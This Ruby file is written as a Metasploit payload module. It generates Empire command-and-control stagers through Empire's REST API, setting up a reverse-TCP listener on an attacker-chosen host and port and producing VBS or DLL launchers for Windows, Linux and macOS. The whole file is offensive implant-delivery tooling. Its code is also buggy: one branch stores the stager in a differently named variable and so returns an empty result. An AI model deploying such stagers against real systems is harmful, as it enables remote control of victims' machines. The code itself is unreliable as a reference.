# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see theMetasploit
# web site for more information on licensing and terms of use.
# http://metasploit.com
require 'socket'
require 'resolv-replace'
require 'msf/core/handler/empire_reverse_tcp.rb'
require 'msf/core/module/data_store'
require 'msf/core/module/options'
require 'msf/core/empire_lib.rb'

module MetasploitModule

  CachedSize = 387

  include Msf::Empire
  include Msf::Module::Options
  include Msf::Module::DataStore
  include Msf::Payload::Stager
  def initialize(info={})
    super(merge_info(info,
    'Name'       => 'Empire Stager Module',
    'Description'=> 'This creates a standalone stager for Empire using the Rest-API',
    'Author'     => ['author_name'],
    'License'    => MSF_LICENSE,
    'Platform'   => ['Windows', 'Linux', 'MacOS'],
    'Arch'       => ARCH_CMD,
    'Handler'    => Msf::Handler::EmpireReverseTcp
    ))
    register_options(
      [
      OptAddress.new(
        'LHOST',
        [true,
        'The local address to lisen on'
        ]),
      OptPort.new(
        'LPORT',
        [true,
        'The local port to listen on'
        ]),
      OptString.new(
        'ListenerName',
        [true,
        'The empire listener name that would listen for the created stager on the local system',
        ]),
      OptString.new(
        'StagerType',
        [true,
        'The type of stager to be generated','windows/launcher_vbs']),
      OptString.new(
        'PathToEmpire',
        [true,
        'The complete path to Empire-WEB API',
        ])
    ])
  end

  def generate
    def gen_port
      rand_port = rand(2000..62000)
      if not system("netstat -nlt | grep #{rand_port} >> /dev/null")
        return rand_port
      else
        gen_port()
      end
    end
    #
    #Storing data from user
    #
    @host = datastore['LHOST'].to_s
    @port = datastore['LPORT'].to_s
    @listener_name = datastore['ListenerName'].to_s
    @stager_type = datastore['StagerType'].to_s
    @path = datastore['PathToEmpire'].to_s.chomp
    @stagerCode = ''
    #
    #Set excepions at breakpoints.
    #Changing path to the Empire directory
    #
    #Dir.chdir(@path)
    #if not File.file?("empire.sh")
    #  return "Invalid Directory"
    #end
    #
    #Check for open Empire Instance over 1337
    #
    #if not system("netstat -nlt | grep 1337 >> /dev/null")
    #  return "Empire-API not yet active"
    #end
    #
    #Setting default values for msfconsole to initiate
    #LHOST
    #
    if datastore['LHOST']
      @host = datastore['LHOST']
    else
      ip = Socket.ip_address_list.detect{|intf| intf.ipv4_private?}
      @host = ip.ip_address
    end
    #LPORT
    if datastore['LPORT']
      @port = datastore['LPORT']
    else
      @port = gen_port()
    end
    #ListenerName
    if datastore['ListenerName']
      @listener_name = datastore['ListenerName']
    else
      @listener_name = "ListenerEmpire#{rand(1..100)}"
    end
    #
    #Creating an empire object
    #
    client_emp = Msf::Empire::Client.new
    #
    #Check if any listener with provided listener name exists previously
    #
    response = client_emp.is_listener_active(@listener_name)
    if response == false
      responseListener = client_emp.create_listener(@listener_name, @port, @host)
      raise responseListener.to_s if responseListener.to_s.include?("Failed")
    else
      print_status(response)
    end
    #
    #Generating payload
    #
    if @stager_type == "windows/dll"
      @stagerCode = client_emp.generate_dll(@listener_name, 'x86', @path)
    else
      @stager_code = client_emp.gen_stager(@listener_name, @stager_type)
    end
    return @stagerCode
  end
end

